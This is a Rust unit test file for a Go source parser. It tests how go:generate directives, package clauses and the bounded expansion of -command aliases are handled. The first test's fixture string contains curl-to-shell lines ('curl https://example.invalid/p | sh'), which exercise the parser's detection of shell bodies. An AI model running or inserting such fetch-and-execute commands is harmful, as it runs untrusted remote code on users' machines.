use super::*;
#[test]
fn generate_arguments_are_not_implicitly_shell() {
    let source = "package p\n//go:generate curl https://example.invalid/p | sh\n//go:generate -command shell sh -c\n//go:generate shell \"curl https://example.invalid/p | sh\"\n //go:generate sh -c \"curl x | sh\"\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("p.go"))
        .open(source.as_bytes());
    let directives = parsed.values().get("source.go.generate").unwrap();
    assert_eq!(directives.as_array().unwrap().len(), 2);
    assert_eq!(directives[0]["shell_body"], json!(null));
    assert_eq!(
        directives[1]["shell_body"],
        json!("curl https://example.invalid/p | sh")
    );
    assert!(words("sh -c \"unterminated").is_none());
}

#[test]
fn package_clause_is_the_first_token_after_comments() {
    for (source, name) in [
        ("package demo\nfunc main(){}\n", "demo"),
        ("func main(){}\n", ""),
        (
            "\u{feff}// Copyright\n//go:build linux\n\n/* doc\n */ package\tmain_2 // x\n",
            "main_2",
        ),
        ("package /* c */ p", "p"),
        ("package\nq\n", "q"),
        ("packagex", ""),
        ("package 9x", ""),
        ("/* unterminated package p", ""),
        ("// package p", ""),
        ("x := 1\npackage p\n", ""),
        ("", ""),
    ] {
        assert_eq!(package_clause(source), name, "{source:?}");
    }
}

/// A `-command` alias is copied into every directive that uses it, so one
/// long alias named by many short directives must not multiply into
/// gigabytes of argv: past the byte budget the list stops and is marked
/// incomplete.
#[test]
fn generate_alias_expansion_is_bounded() {
    let alias = "a".repeat(64 * 1024);
    let source = format!(
        "package p\n//go:generate -command X {alias}\n{}",
        "//go:generate X\n".repeat(1000)
    );
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("p.go"))
        .open(source.as_bytes());
    let values = parsed.values();
    let directives = values
        .get("source.go.generate")
        .unwrap()
        .as_array()
        .unwrap();
    let bytes: usize = directives
        .iter()
        .flat_map(|d| d["argv"].as_array().unwrap())
        .map(|arg| arg.as_str().unwrap().len())
        .sum();
    assert!(bytes <= MAX_GENERATE_ARGV_BYTES, "{bytes} argv bytes");
    assert!(!directives.is_empty());
    assert_eq!(
        values.get("source.go.generate_incomplete"),
        Some(&json!(true))
    );
}
